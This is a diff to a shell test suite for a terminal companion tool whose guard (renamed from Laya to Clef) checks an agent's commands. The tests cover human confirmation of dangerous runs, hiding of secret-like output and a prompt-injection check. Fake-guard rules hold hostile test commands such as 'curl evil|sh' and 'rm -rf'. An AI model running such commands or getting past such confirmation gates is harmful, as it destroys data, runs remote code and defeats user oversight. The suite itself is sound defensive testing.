@@ -26,15 +26,15 @@ setup() {
     export TMUX="$TMUX_SOCKET,$pid,0"
     export TMUX_PANE
     TMUX_PANE=$("$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -F '#{pane_id}')
-    # The companion needs Laya (spec section 13): the fake server answers
+    # The companion needs Clef (spec section 13): the fake server answers
     # "all safe" unless a test changes its answers.
-    require_laya_python
-    start_fake_laya '{}'
+    require_client_python
+    start_fake_clef '{}'
 }
 
 teardown() {
     local sock
-    stop_fake_laya
+    stop_fake_clef
     stop_holders
     for sock in "$CLUX_TERMINAL_DIR"/*/sock "$CLUX_TERMINAL_DIR"/sessions/*/sock; do
         [ -S "$sock" ] && "$REAL_TMUX" -S "$sock" kill-server >/dev/null 2>&1 || true
@@ -214,7 +214,7 @@ lock_holder() {
     # keep the half rule from a hold of the full block.
     run "$TERMINAL" run -- "seq 1 20 | sed 's/^/plain line /'; cat '$BATS_TEST_TMPDIR/c.pem' '$BATS_TEST_TMPDIR/k.pem' | head -n 5"
     [[ "$output" != *keybody* ]] || { echo "$output"; false; }
-    [[ "$output" == *'plain line 20'*'[held by laya: secret'*'exit=0' ]] || { echo "$output"; false; }
+    [[ "$output" == *'plain line 20'*'[held by clef: secret'*'exit=0' ]] || { echo "$output"; false; }
 }
 
 @test "run of the end of a key file shows no line of the key" {
@@ -223,7 +223,7 @@ lock_holder() {
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run -- "tail -n 3 '$BATS_TEST_TMPDIR/k'"
     [[ "$output" != *b3BlbnNz* ]] && [[ "$output" != *keybody* ]] || { echo "$output"; false; }
-    [[ "$output" == *'[held by laya: secret, 3 lines]'* ]] || { echo "$output"; false; }
+    [[ "$output" == *'[held by clef: secret, 3 lines]'* ]] || { echo "$output"; false; }
 }
 
 # 5
@@ -495,100 +495,23 @@ lock_holder() {
     ! "$REAL_TMUX" -S "$sock" list-sessions >/dev/null 2>&1 || false
 }
 
-# Laya 6
-@test "close stops the laya server that open started and deletes laya.log" {
-    local data="$BATS_TEST_TMPDIR/data" d pid
-    make_fake_venv "$data/clux/laya"
-    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
-    run env CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
-        "$TERMINAL" open
-    [ "$status" -eq 0 ] || { echo "$output"; false; }
-    d=$(companion_dir)
-    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
-    [ -n "$pid" ]
-    ps -o command= -p "$pid" | grep -q laya-serve
-    [ "$(file_mode "$d/laya.log")" = 600 ]
-    grep -q '^laya_url=http://127.0.0.1:[0-9][0-9]*$' "$d/state"
-    grep -Eq '^laya_key=[0-9a-f]{64}$' "$d/state"
-    run "$TERMINAL" close
-    [ "$status" -eq 0 ]
-    ! kill -0 "$pid" 2>/dev/null || false
-    [ ! -e "$d" ]
-}
-
+# Clef 6
 @test "close --hook removes the pane and the directory first and does not wait for the server" {
-    local data="$BATS_TEST_TMPDIR/data" d pid pane start
-    make_fake_venv "$data/clux/laya"
-    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
-    CLUX_FAKE_LAYA_IGNORE_TERM=1 CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
-        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
+    local data="$BATS_TEST_TMPDIR/data" d pane start
+    XDG_DATA_HOME="$data" "$TERMINAL" open >/dev/null
     d=$(companion_dir)
     pane=$(companion_pane)
-    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
-    kill -0 "$pid"
     start=$SECONDS
     run "$TERMINAL" close --hook < /dev/null
-    local took=$((SECONDS - start)) alive=0
-    ! kill -0 "$pid" 2>/dev/null || alive=1
-    # The server ignores TERM, so it holds the bats output until kill -9.
-    kill -9 "$pid" 2>/dev/null || true
+    local took=$((SECONDS - start))
     [ "$status" -eq 0 ]
     [ "$took" -lt 2 ]
-    [ "$alive" -eq 1 ]
     [ ! -e "$d" ]
     ! "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null 2>&1 || false
 }
 
-@test "close --hook still stops a server that ignores TERM, after the hook ends" {
-    local data="$BATS_TEST_TMPDIR/data" d pid i=0
-    make_fake_venv "$data/clux/laya"
-    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
-    CLUX_FAKE_LAYA_IGNORE_TERM=1 CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
-        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
-    d=$(companion_dir)
-    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
-    "$TERMINAL" close --hook < /dev/null
-    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 30 ]; do sleep .2; i=$((i + 1)); done
-    local alive=0
-    ! kill -0 "$pid" 2>/dev/null || alive=1
-    kill -9 "$pid" 2>/dev/null || true
-    [ "$alive" -eq 0 ]
-}
-
-@test "open stops the laya server of a dead companion of the same owner" {
-    local data="$BATS_TEST_TMPDIR/data" d pid i=0
-    make_fake_venv "$data/clux/laya"
-    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
-    CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
-        "$TERMINAL" open >/dev/null
-    d=$(companion_dir)
-    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
-    kill -0 "$pid"
-    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-pane -t "$(companion_pane)"
-    CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
-        "$TERMINAL" open >/dev/null
-    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 25 ]; do sleep .2; i=$((i + 1)); done
-    ! kill -0 "$pid" 2>/dev/null || { kill -9 "$pid"; false; }
-    "$TERMINAL" close
-}
-
-@test "the reaper stops the laya server of an owner pane that is gone" {
-    local data="$BATS_TEST_TMPDIR/data" other pid
-    make_fake_venv "$data/clux/laya"
-    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
-    other=$("$REAL_TMUX" -S "$TMUX_SOCKET" split-window -d -P -F '#{pane_id}' -t "$TMUX_PANE" 3>&-)
-    TMUX_PANE="$other" CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
-        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
-    pid=$(sed -n 's/^laya_pid=//p' "$CLUX_TERMINAL_DIR"/*-"${other#%}"/state)
-    [ -n "$pid" ]
-    kill -0 "$pid"
-    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-pane -t "$other"
-    "$TERMINAL" open >/dev/null
-    ! kill -0 "$pid" 2>/dev/null || false
-}
-
 @test "wait --idle prints the pane state at its time limit" {
-    set_fake_laya '{"answers": {"state": "pager"}}'
+    set_fake_clef '{"answers": {"state": "pager"}}'
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'sleep 3' >/dev/null
     run "$TERMINAL" wait --timeout 1 --idle
@@ -599,19 +522,19 @@ lock_holder() {
 @test "wait --idle exits 6 after three failed pane probes in a row, not after one" {
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
-    stop_fake_laya
+    stop_fake_clef
     run "$TERMINAL" wait --timeout 2 --idle
     [ "$status" -eq 1 ]
     run "$TERMINAL" wait --timeout 10 --idle
     [ "$status" -eq 6 ]
-    [[ "$output" == *'laya not available: close and open the companion'* ]] || false
+    [[ "$output" == *'clef not available: close and open the companion'* ]] || false
 }
 
 @test "wait --pattern goes on after one failed pane probe" {
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
     # Only the pane question fails: the guard of the screen still works.
-    set_fake_laya '{"rules": [{"asks": "state", "fail": 500}]}'
+    set_fake_clef '{"rules": [{"asks": "state", "fail": 500}]}'
     # Two probes in 1 s: fewer than the three failures in a row that stop it.
     run "$TERMINAL" wait --timeout 1 --pattern 'clux-no-match'
     [ "$status" -eq 1 ] || { echo "$output"; false; }
@@ -621,20 +544,20 @@ lock_holder() {
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run --timeout 1 -- 'sleep 15'
     [ "$status" -eq 1 ]
-    stop_fake_laya
+    stop_fake_clef
     run "$TERMINAL" wait --timeout 10 --run 1
     [ "$status" -eq 6 ]
-    [ "$output" = 'laya not available: run 1 continues in the pane; use wait --run 1 again' ]
+    [ "$output" = 'clef not available: run 1 continues in the pane; use wait --run 1 again' ]
 }
 
 @test "a wait sends no pane request while the screen does not change" {
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
     sleep 1
-    : > "$FAKE_LAYA_LOG"
+    : > "$FAKE_CLEF_LOG"
     run "$TERMINAL" wait --timeout 4 --idle
     [ "$status" -eq 1 ]
-    [ "$(fake_laya_states state | wc -l | tr -d ' ')" -eq 1 ]
+    [ "$(fake_clef_states state | wc -l | tr -d ' ')" -eq 1 ]
 }
 
 @test "a blank cursor line is not the line above it" {
@@ -643,24 +566,24 @@ lock_holder() {
     pane_shows abc
     run "$TERMINAL" send --enter -- 'hello'
     [ "$status" -eq 0 ]
-    [ "$(fake_laya_states destructive | tail -n 1)" = '"hello"' ]
+    [ "$(fake_clef_states destructive | tail -n 1)" = '"hello"' ]
     # The pane probe gets the blank cursor line as its last line.
     "$TERMINAL" send --enter -- 'read -r y' >/dev/null
     "$TERMINAL" wait --timeout 2 --idle >/dev/null || true
-    [[ "$(fake_laya_states state | tail -n 1)" == *'read -r y\n"' ]] || { fake_laya_states state | tail -n 1; false; }
+    [[ "$(fake_clef_states state | tail -n 1)" == *'read -r y\n"' ]] || { fake_clef_states state | tail -n 1; false; }
 }
 
-@test "a credential answer from Laya stops a run with exit 3" {
-    set_fake_laya '{"rules": [{"contains": "Enter value", "answers": {"state": "credential"}}]}'
+@test "a credential answer from Clef stops a run with exit 3" {
+    set_fake_clef '{"rules": [{"contains": "Enter value", "answers": {"state": "credential"}}]}'
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run --timeout 5 -- 'read -r -p "Enter value " v; echo "got:$v"'
     [ "$status" -eq 3 ]
     [[ "$output" == *'credential prompt in the companion pane'* ]] || false
 }
 
-# Laya 1
+# Clef 1
 @test "a dangerous run asks the user in the pane: y runs it, n declines it" {
-    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+    set_fake_clef '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     local one="$BATS_TEST_TMPDIR/clux-danger-1" two="$BATS_TEST_TMPDIR/clux-danger-2" d
     mkdir -p "$one" "$two"
@@ -668,12 +591,12 @@ lock_holder() {
     run "$TERMINAL" run --timeout 2 -- "rm -rf '$one'"
     [ "$status" -eq 1 ]
     [[ "$output" == 'run=1'* ]] || false
-    pane_shows 'laya: dangerous (destructive 0.95)'
+    pane_shows 'clef: dangerous (destructive 0.95)'
     pane_shows 'run? [y/N]'
     [ -d "$one" ]
     run "$TERMINAL" send -- 'y'
     [ "$status" -eq 3 ]
-    [ "$output" = 'laya confirmation in the companion pane: the user must answer it there' ]
+    [ "$output" = 'clef confirmation in the companion pane: the user must answer it there' ]
     run "$TERMINAL" read
     [ "$status" -eq 3 ]
     run "$TERMINAL" wait --timeout 1 --idle
@@ -692,9 +615,9 @@ lock_holder() {
     "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" n Enter
     run "$TERMINAL" wait --timeout 5 --run 2
     [ "$status" -eq 0 ]
-    [ "$output" = $'laya: declined by the user\nexit=126' ]
+    [ "$output" = $'clef: declined by the user\nexit=126' ]
     [ -d "$two" ]
-    # Laya examines the screen with each send, so the screen with
+    # Clef examines the screen with each send, so the screen with
     # clux-danger must go first.
     "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" clear Enter
     sleep .5
@@ -706,7 +629,7 @@ lock_holder() {
 }
 
 @test "a declined run cannot run again through __clux_run" {
-    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+    set_fake_clef '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     local one="$BATS_TEST_TMPDIR/clux-danger-1" d
     mkdir -p "$one"
@@ -717,8 +640,8 @@ lock_holder() {
     "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" n Enter
     run "$TERMINAL" wait --timeout 5 --run 1
     [ "$status" -eq 0 ]
-    [ "$output" = $'laya: declined by the user\nexit=126' ]
-    # The reserved word is refused before Laya, in send and in run.
+    [ "$output" = $'clef: declined by the user\nexit=126' ]
+    # The reserved word is refused before Clef, in send and in run.
     run "$TERMINAL" send --enter -- '__clux_run 1'
     [ "$status" -eq 2 ]
     run "$TERMINAL" send -- ' __clux_run 1'
@@ -733,43 +656,43 @@ lock_holder() {
     [ "$(cat "$d/1.rc")" = 126 ]
 }
 
-# Laya 2
+# Clef 2
 @test "a caution run prints the note before exit, also through wait --run" {
-    set_fake_laya '{"rules": [{"contains": "touch", "answers": {"risk": "caution", "destructive": 0.4}}]}'
+    set_fake_clef '{"rules": [{"contains": "touch", "answers": {"risk": "caution", "destructive": 0.4}}]}'
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/c'"
     [ "$status" -eq 0 ]
-    [[ "$output" == *$'laya: caution (destructive 0.40)\nexit=0' ]] || false
+    [[ "$output" == *$'clef: caution (destructive 0.40)\nexit=0' ]] || false
     [ -e "$BATS_TEST_TMPDIR/c" ]
     run "$TERMINAL" run --timeout 1 -- "sleep 2; touch '$BATS_TEST_TMPDIR/d'"
     [ "$status" -eq 1 ]
     run "$TERMINAL" wait --timeout 10 --run 2
     [ "$status" -eq 0 ]
-    [[ "$output" == *$'laya: caution (destructive 0.40)\nexit=0' ]] || false
+    [[ "$output" == *$'clef: caution (destructive 0.40)\nexit=0' ]] || false
 }
 
-# Laya 5
-@test "run exits 6 and does not run the command when Laya stops" {
+# Clef 5
+@test "run exits 6 and does not run the command when Clef stops" {
     "$TERMINAL" open >/dev/null
-    stop_fake_laya
+    stop_fake_clef
     run "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/never'"
     [ "$status" -eq 6 ]
-    [[ "$output" == *'laya not available: close and open the companion'* ]] || false
+    [[ "$output" == *'clef not available: close and open the companion'* ]] || false
     [ ! -e "$BATS_TEST_TMPDIR/never" ]
     [ ! -d "$(companion_dir)/busy" ]
 }
 
-@test "send --key C-c stops a command when Laya stops" {
+@test "send --key C-c stops a command when Clef stops" {
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- "sleep 2 && touch '$BATS_TEST_TMPDIR/never'" >/dev/null
-    stop_fake_laya
+    stop_fake_clef
     # Escape first: after C-c the clux prompt can come back, and Escape is
     # not permitted there.
     run "$TERMINAL" send --key Escape
     [ "$status" -eq 0 ] || { echo "$status $output"; false; }
     run "$TERMINAL" send --key C-c
     [ "$status" -eq 0 ]
-    # Text still needs Laya. (At the clux prompt a key on a blank line needs
+    # Text still needs Clef. (At the clux prompt a key on a blank line needs
     # no request: there is no pane request there, and a blank line runs nothing.)
     run "$TERMINAL" send -- 'ls'
     [ "$status" -eq 6 ]
@@ -777,14 +700,14 @@ lock_holder() {
     [ ! -e "$BATS_TEST_TMPDIR/never" ]
 }
 
-@test "each run command goes to Laya, also ls and echo" {
+@test "each run command goes to Clef, also ls and echo" {
     "$TERMINAL" open >/dev/null
-    : > "$FAKE_LAYA_LOG"
+    : > "$FAKE_CLEF_LOG"
     run "$TERMINAL" run -- 'ls'
     [ "$status" -eq 0 ]
     run "$TERMINAL" run -- 'echo hi'
     [ "$status" -eq 0 ]
-    [ "$(fake_laya_states destructive)" = $'"ls"\n"echo hi"' ]
+    [ "$(fake_clef_states destructive)" = $'"ls"\n"echo hi"' ]
 }
 
 @test "run refuses a blank command with exit 2" {
@@ -816,9 +739,9 @@ lock_holder() {
     [ "$output" = $'run=1\nstill-here\nexit=0' ]
 }
 
-# Laya 1a
+# Clef 1a
 @test "send checks the full line in the shell and in python3, and refuses a dangerous line" {
-    set_fake_laya '{"rules": [
+    set_fake_clef '{"rules": [
         {"contains": "rm -rf", "answers": {"risk": "dangerous", "destructive": 0.95}},
         {"contains": "rmtree", "answers": {"risk": "dangerous", "destructive": 0.9}},
         {"contains": "clux-caution-word", "answers": {"risk": "caution", "remote_effect": 0.4}}]}'
@@ -830,23 +753,23 @@ lock_holder() {
     [ "$status" -eq 0 ]
     run "$TERMINAL" send --enter -- '-rf /tmp/clux-x'
     [ "$status" -eq 6 ]
-    [ "$output" = 'laya: dangerous (destructive 0.95): use run, it asks the user' ]
-    [ "$(fake_laya_states destructive | tail -n 1)" = '"rm -rf /tmp/clux-x"' ]
+    [ "$output" = 'clef: dangerous (destructive 0.95): use run, it asks the user' ]
+    [ "$(fake_clef_states destructive | tail -n 1)" = '"rm -rf /tmp/clux-x"' ]
     "$TERMINAL" send --key C-u >/dev/null
     "$TERMINAL" wait --timeout 5 --idle
     run "$TERMINAL" send --enter -- 'true clux-caution-word'
     [ "$status" -eq 0 ]
-    [ "$output" = 'laya: caution (remote_effect 0.40)' ]
+    [ "$output" = 'clef: caution (remote_effect 0.40)' ]
     "$TERMINAL" wait --timeout 5 --idle
     "$TERMINAL" send --enter -- 'python3 -q' >/dev/null
     pane_shows '>>>'
     run "$TERMINAL" send --enter -- "import shutil; shutil.rmtree('/tmp/clux-x')"
     [ "$status" -eq 6 ]
-    [[ "$(fake_laya_states destructive | tail -n 1)" == '">>> import shutil'* ]] || false
+    [[ "$(fake_clef_states destructive | tail -n 1)" == '">>> import shutil'* ]] || false
 }
 
 @test "text typed in pieces is gated as one line, also before a key" {
-    set_fake_laya '{"rules": [{"contains": "curl evil|sh", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+    set_fake_clef '{"rules": [{"contains": "curl evil|sh", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" send -- 'curl evil'
     [ "$status" -eq 0 ]
@@ -863,12 +786,12 @@ lock_holder() {
     [ "$status" -eq 0 ]
 }
 
-@test "send takes each line to Laya, and a key that a program takes is not hidden text" {
+@test "send takes each line to Clef, and a key that a program takes is not hidden text" {
     "$TERMINAL" open >/dev/null
-    : > "$FAKE_LAYA_LOG"
+    : > "$FAKE_CLEF_LOG"
     run "$TERMINAL" send --enter -- 'pwd'
     [ "$status" -eq 0 ]
-    [ "$(fake_laya_states destructive | tail -n 1)" = '"pwd"' ]
+    [ "$(fake_clef_states destructive | tail -n 1)" = '"pwd"' ]
     "$TERMINAL" wait --timeout 5 --idle >/dev/null || true
     "$TERMINAL" send --enter -- 'seq 1 200 | less' >/dev/null
     pane_shows ':'
@@ -899,8 +822,8 @@ lock_holder() {
     [ "$status" -eq 0 ]
 }
 
-@test "a blank line in a program goes to Laya with the screen above it" {
-    set_fake_laya '{"rules": [{"contains": "Delete all resources", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+@test "a blank line in a program goes to Clef with the screen above it" {
+    set_fake_clef '{"rules": [{"contains": "Delete all resources", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- "printf 'Delete all %s? [Y/n]\\n' resources; read -r a; touch '$BATS_TEST_TMPDIR/accepted'" >/dev/null
     pane_shows 'Delete all resources? [Y/n]'
@@ -911,10 +834,10 @@ lock_holder() {
     "$TERMINAL" send --key C-c >/dev/null
     # A blank line at the clux$ prompt needs no request.
     "$TERMINAL" wait --timeout 5 --idle
-    : > "$FAKE_LAYA_LOG"
+    : > "$FAKE_CLEF_LOG"
     run "$TERMINAL" send --key Enter
     [ "$status" -eq 0 ]
-    [ -z "$(fake_laya_states destructive)" ]
+    [ -z "$(fake_clef_states destructive)" ]
 }
 
 @test "the clux$ prompt after output with no last newline is still the prompt" {
@@ -922,10 +845,10 @@ lock_holder() {
     run "$TERMINAL" run -- 'printf foo'
     [ "$status" -eq 0 ]
     pane_shows "foo$(prompt_mark)"
-    : > "$FAKE_LAYA_LOG"
+    : > "$FAKE_CLEF_LOG"
     run "$TERMINAL" send --enter -- 'echo hi'
     [ "$status" -eq 0 ]
-    [ "$(fake_laya_states destructive | tail -n 1)" = '"echo hi"' ]
+    [ "$(fake_clef_states destructive | tail -n 1)" = '"echo hi"' ]
     "$TERMINAL" wait --timeout 5 --idle
     run "$TERMINAL" run -- 'printf foo'
     [ "$status" -eq 0 ]
@@ -952,27 +875,27 @@ lock_holder() {
 }
 
 @test "a move key in a pager goes to the pane with no command request" {
-    set_fake_laya '{"rules": [
+    set_fake_clef '{"rules": [
         {"asks": "state", "contains": "(END)", "answers": {"state": "pager"}},
         {"asks": "state", "contains": ":", "answers": {"state": "pager"}},
         {"asks": "destructive", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" 'seq 1 200 | less' Enter
     pane_shows ':'
-    : > "$FAKE_LAYA_LOG"
+    : > "$FAKE_CLEF_LOG"
     run "$TERMINAL" send --key PageDown
     [ "$status" -eq 0 ] || { echo "$output"; false; }
     run "$TERMINAL" send --key up
     [ "$status" -eq 0 ]
-    [ -z "$(fake_laya_states destructive)" ]
+    [ -z "$(fake_clef_states destructive)" ]
     # Other keys still go to the gate.
     run "$TERMINAL" send --key Space
     [ "$status" -eq 6 ]
     "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" q
 }
 
-@test "an interrupt key works while a Laya question is open" {
-    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+@test "an interrupt key works while a Clef question is open" {
+    set_fake_clef '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     mkdir -p "$BATS_TEST_TMPDIR/clux-danger"
     run "$TERMINAL" run --timeout 2 -- "rm -rf '$BATS_TEST_TMPDIR/clux-danger'"
@@ -984,7 +907,7 @@ lock_holder() {
     [ "$status" -eq 0 ]
     run "$TERMINAL" wait --timeout 5 --run 1
     [ "$status" -eq 0 ]
-    [ "$output" = $'laya: declined by the user\nexit=126' ]
+    [ "$output" = $'clef: declined by the user\nexit=126' ]
     [ -d "$BATS_TEST_TMPDIR/clux-danger" ]
 }
 
@@ -1028,15 +951,15 @@ lock_holder() {
     [ ! -e "$BATS_TEST_TMPDIR/hidden" ]
 }
 
-# Laya 3
+# Clef 3
 @test "run holds an AKIA line and keeps the lines around it" {
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run -- 'printf "a\nAKIAABCDEFGHIJKLMNOP\nb\n"'
     [ "$status" -eq 0 ]
-    [ "$output" = $'run=1\na\n[held by laya: secret]\nb\nlaya: held 1 lines\nexit=0' ]
+    [ "$output" = $'run=1\na\n[held by clef: secret]\nb\nclef: held 1 lines\nexit=0' ]
 }
 
-# Laya 4
+# Clef 4
 @test "read and wait --pattern use the guarded text" {
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'echo visible-marker; echo two; echo three; echo AKIAABCDEFGHIJKLMNOP' >/dev/null
@@ -1047,7 +970,7 @@ lock_holder() {
     run "$TERMINAL" read
     [ "$status" -eq 0 ]
     [[ "$output" == *'visible-marker'* ]] || false
-    [[ "$output" == *'[held by laya: secret]'* ]] || false
+    [[ "$output" == *'[held by clef: secret]'* ]] || false
     [[ "$output" != *'AKIAABCDEFGHIJKLMNOP'* ]] || false
 }
 
@@ -1058,7 +981,7 @@ lock_holder() {
     # Only the guard fails. A verb that tests the raw screen first never asks
     # the guard for a pattern that is not on the screen, and so its time and
     # exit tell what the raw screen holds.
-    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
+    set_fake_clef '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
     run "$TERMINAL" wait --timeout 6 --pattern 'clux-no-match'
     [ "$status" -eq 6 ] || { echo "$status $output"; false; }
 }
@@ -1067,8 +990,8 @@ lock_holder() {
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'echo pattern-marker' >/dev/null
     "$TERMINAL" wait --timeout 5 --idle >/dev/null
-    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
-    ( sleep 1.5; set_fake_laya '{}' ) 3>&- &
+    set_fake_clef '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
+    ( sleep 1.5; set_fake_clef '{}' ) 3>&- &
     local switch=$!
     run "$TERMINAL" wait --timeout 8 --pattern 'pattern-marker'
     wait "$switch"
@@ -1078,14 +1001,14 @@ lock_holder() {
 @test "send and run take the typing lock, and take over the lock of a dead holder" {
     "$TERMINAL" open >/dev/null
     hold_lock "$(companion_dir)/typing"
-    : > "$FAKE_LAYA_LOG"
+    : > "$FAKE_CLEF_LOG"
     run "$TERMINAL" send -- 'echo x'
     [ "$status" -eq 5 ]
     [ "$output" = 'another send or run is typing in the pane: try again' ]
     run "$TERMINAL" run -- 'echo x'
     [ "$status" -eq 5 ]
     [ ! -d "$(companion_dir)/busy" ]
-    [ -z "$(fake_laya_states destructive)" ]
+    [ -z "$(fake_clef_states destructive)" ]
     stop_holders
     run "$TERMINAL" run -- 'echo taken'
     [ "$status" -eq 0 ]
@@ -1094,12 +1017,12 @@ lock_holder() {
 }
 
 @test "run holds all output and exits 6 when the guard fails, and wait --run gives it later" {
-    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
+    set_fake_clef '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run -- 'echo guard-marker'
     [ "$status" -eq 6 ]
-    [[ "$output" == *$'output held: laya not available: use wait --run 1 again\nexit=0'* ]] || false
-    [[ "$output" == *'laya not available: the output stays; use wait --run 1 when Laya answers'* ]] || false
+    [[ "$output" == *$'output held: clef not available: use wait --run 1 again\nexit=0'* ]] || false
+    [[ "$output" == *'clef not available: the output stays; use wait --run 1 when Clef answers'* ]] || false
     [[ "$output" != *'close and open'* ]] || false
     [[ "$output" != *'guard-marker'* ]] || false
     # The run keeps the lock: no new run deletes the held output.
@@ -1109,7 +1032,7 @@ lock_holder() {
     run "$TERMINAL" run -- 'echo next'
     [ "$status" -eq 5 ]
     [ "$output" = 'the output of run 1 is held: use wait --run 1, or wait --run 1 --discard' ]
-    set_fake_laya '{}'
+    set_fake_clef '{}'
     run "$TERMINAL" wait --run 1
     [ "$status" -eq 0 ]
     [ "$output" = $'guard-marker\nexit=0' ]
@@ -1118,8 +1041,8 @@ lock_holder() {
     [ "$status" -eq 0 ]
 }
 
-@test "wait --run N --discard drops held output that Laya cannot examine" {
-    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
+@test "wait --run N --discard drops held output that Clef cannot examine" {
+    set_fake_clef '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run -- 'echo held-marker'
     [ "$status" -eq 6 ]
@@ -1128,13 +1051,13 @@ lock_holder() {
     [ "$output" = 'the output of run 1 is held: use wait --run 1, or wait --run 1 --discard' ]
     run "$TERMINAL" wait --run 1 --discard
     [ "$status" -eq 0 ]
-    [ "$output" = $'output discarded: laya did not examine it\nexit=0' ]
+    [ "$output" = $'output discarded: clef did not examine it\nexit=0' ]
     [ ! -e "$(companion_dir)/1.out" ]
     run "$TERMINAL" wait --run 1 --discard
     [ "$status" -eq 2 ]
     run "$TERMINAL" wait --idle --discard
     [ "$status" -eq 2 ]
-    set_fake_laya '{}'
+    set_fake_clef '{}'
     run "$TERMINAL" run -- 'echo next'
     [ "$status" -eq 0 ]
 }
@@ -1143,7 +1066,7 @@ lock_holder() {
     "$TERMINAL" open >/dev/null
     run --separate-stderr "$TERMINAL" run -- "head -c 40000 /dev/zero | tr '\\0' x"
     [ "$status" -eq 0 ] || { echo "$status $output $stderr"; false; }
-    [[ "$output" == *$'output cut: the last 32768 bytes are one line with no start: nothing is shown\n'* ]] || { echo "$output"; false; }
+    [[ "$output" == *$'output cut: the last 16384 bytes are one line with no start: nothing is shown\n'* ]] || { echo "$output"; false; }
     [[ "$output" != *xxxx* ]] || false
     [[ "$output" == *'exit=0' ]] || { echo "$output"; false; }
 }
@@ -1152,7 +1075,7 @@ lock_holder() {
     "$TERMINAL" open >/dev/null
     run --separate-stderr "$TERMINAL" run -- 'head -c 40000 /dev/zero; echo; echo nul-end'
     [ "$status" -eq 0 ]
-    [[ "$output" == *$'output cut: the last 32768 bytes, from the first full line\n'* ]] || false
+    [[ "$output" == *$'output cut: the last 16384 bytes, from the first full line\n'* ]] || false
     [[ "$output" == *$'nul-end\nexit=0' ]] || false
     [ -z "$stderr" ]
 }
@@ -1172,28 +1095,26 @@ lock_holder() {
     [ "$status" -eq 0 ]
 }
 
-@test "the guard gets at most the last 32768 bytes of the output" {
+@test "the guard gets at most the last 16384 bytes of the output" {
     "$TERMINAL" open >/dev/null
